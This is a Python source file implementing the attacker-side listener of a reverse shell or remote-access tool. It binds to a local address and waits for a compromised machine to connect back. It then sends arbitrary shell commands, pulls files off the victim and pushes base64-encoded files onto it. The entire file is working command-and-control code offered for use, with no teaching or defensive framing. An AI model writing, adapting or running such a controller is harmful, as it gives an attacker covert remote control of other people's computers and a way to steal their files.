import socket, subprocess, json, base64, os

class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        listener.bind((ip, port))
        listener.listen(0)
        print('Listening on port ' + str(port) + '...')

        self.connection, address = listener.accept()
        print('[+] Connection established from ' + str(address[0]))
    
    def send(self, data):
        jdata = json.dumps(data)
        self.connection.send(jdata.encode())
    
    def receive(self):
        jdata = ''
        while True:
            try:
                jdata += self.connection.recv(1024).decode()
                return json.loads(jdata)
                break
            except ValueError:
                continue
    
    def execute(self,command):
        self.send(command)
        if command[0] != 'quit':
            return self.receive()
        else:
            exit()
    
    def readfile(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())
    
    def writefile(self, path, content):
        if content == '[-] No such file - Syntax Error':
            return content
        else:
            print(path)
            print(os.path.isfile(path))
            with open(path,'wb') as file:
                file.write(base64.b64decode(content.encode()))
                return '[+] File successfully downloaded in ' + path + '\n'
    
    def run(self):
        while True:
            wd = (self.execute('cd').replace('\\n','').replace('\\r','').encode().decode('unicode_escape'))[2:-1]
            command = input(f'{wd} >> ')
            command = command.split(' ')
            if command[0] == 'clear':
                try:
                    os.system('clear')
                except:
                    os.system('cls')
            elif command[0] == 'download':
                if '*' in command[1]:
                    command[1] = command[1].replace('*', ' ')
                result = self.execute(command)
                try:
                    result = self.writefile(command[-1] + '\\' + command[1], result)
                except:
                    result = self.writefile(command[-1] + '\\' + command[1], result)
                print(result)
            elif command[0] == 'upload':
                try:
                    if '*' in command[1]:
                        command[1] = command[1].replace('*', ' ')
                    contents = self.readfile(command[1]).decode()
                    command.append(contents)
                    result = self.execute(command)
                    print(result)
                except:
                    print('[-] No such file - Syntax Error')
            else:
                result = self.execute(command).encode().decode('unicode_escape')
                if result == 'null':
                    break
                else:
                    if result[0] == 'b' and result[1] == '\'' and result[-1] == '\'':
                        result = result[2:-1]
                    else:pass
                    print(result)

listener = Listener('192.168.1.60',8080)
listener.run()